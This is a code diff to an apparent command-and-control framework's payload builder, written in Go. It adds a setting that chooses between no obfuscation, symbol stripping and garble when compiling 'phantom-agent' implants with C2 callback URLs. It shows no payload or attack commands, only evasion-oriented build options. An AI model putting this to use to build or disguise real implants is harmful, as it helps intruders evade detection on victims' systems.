@@ -17,12 +17,13 @@ import (
 
 // PayloadRequest is the JSON body for payload generation.
 type PayloadRequest struct {
-	Type        string `json:"type"`         // exe, elf, aspx, php, android, ios, app, etc.
-	ListenerURL string `json:"listener_url"` // C2 callback URL
-	Sleep       int    `json:"sleep"`        // Agent sleep seconds
-	Jitter      int    `json:"jitter"`       // Agent jitter percentage
-	Obfuscate   bool   `json:"obfuscate"`    // Use garble
-	AppTemplate string `json:"app_template"` // For "app" type — template name
+	Type           string `json:"type"`            // exe, elf, aspx, php, android, ios, app, etc.
+	ListenerURL    string `json:"listener_url"`    // C2 callback URL
+	Sleep          int    `json:"sleep"`           // Agent sleep seconds
+	Jitter         int    `json:"jitter"`          // Agent jitter percentage
+	Obfuscate      bool   `json:"obfuscate"`       // Use garble (legacy boolean)
+	ObfuscateLevel string `json:"obfuscate_level"` // "none" | "strip" | "garble"
+	AppTemplate    string `json:"app_template"`    // For "app" type — template name
 }
 
 // PayloadResponse is returned after generation.
@@ -191,6 +192,7 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	targetOS := "linux"
 	targetArch := "amd64"
 	obfuscate := false
+	stripOnly := false // strip symbols only, no garble
 
 	buildMode := ""
 
@@ -212,6 +214,19 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 		buildMode = "dll"
 	}
 
+	// ObfuscateLevel overrides type-based obfuscation for base types (exe, elf, darwin)
+	switch req.ObfuscateLevel {
+	case "garble":
+		obfuscate = true
+		stripOnly = false
+	case "strip":
+		obfuscate = false
+		stripOnly = true
+	case "none":
+		obfuscate = false
+		stripOnly = false
+	}
+
 	os.MkdirAll("build/agents", 0755)
 
 	ext := ""
@@ -221,12 +236,15 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	if buildMode == "dll" {
 		ext = ".dll"
 	}
-	filename := fmt.Sprintf("phantom-agent_%s_%s%s", targetOS, targetArch, ext)
+	suffix := ""
 	if obfuscate {
-		filename = fmt.Sprintf("phantom-agent_%s_%s_garbled%s", targetOS, targetArch, ext)
+		suffix = "_garbled"
+	} else if stripOnly {
+		suffix = "_stripped"
 	}
+	filename := fmt.Sprintf("phantom-agent_%s_%s%s%s", targetOS, targetArch, suffix, ext)
 	if buildMode == "service" {
-		filename = fmt.Sprintf("phantom-svc_%s_%s%s", targetOS, targetArch, ext)
+		filename = fmt.Sprintf("phantom-svc_%s_%s%s%s", targetOS, targetArch, suffix, ext)
 	}
 	if buildMode == "dll" {
 		filename = fmt.Sprintf("phantom-agent_%s_%s%s", targetOS, targetArch, ext)
@@ -343,7 +361,17 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 		if targetOS == "darwin" {
 			agentPkg = "./cmd/agent-darwin"
 		}
-		buildCmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, agentPkg)
+		// Strip level: add -s -w -trimpath but skip garble
+		stripFlags := ldflags
+		if stripOnly {
+			stripFlags = ldflags + " -s -w"
+		}
+		buildArgs := []string{"build", "-trimpath", "-ldflags", stripFlags, "-o", outputPath, agentPkg}
+		if !stripOnly {
+			// Plain build without -trimpath for easier debugging
+			buildArgs = []string{"build", "-ldflags", ldflags, "-o", outputPath, agentPkg}
+		}
+		buildCmd := exec.Command("go", buildArgs...)
 		buildCmd.Dir = projectRoot
 		buildCmd.Env = env
 		if out, err := buildCmd.CombinedOutput(); err != nil {
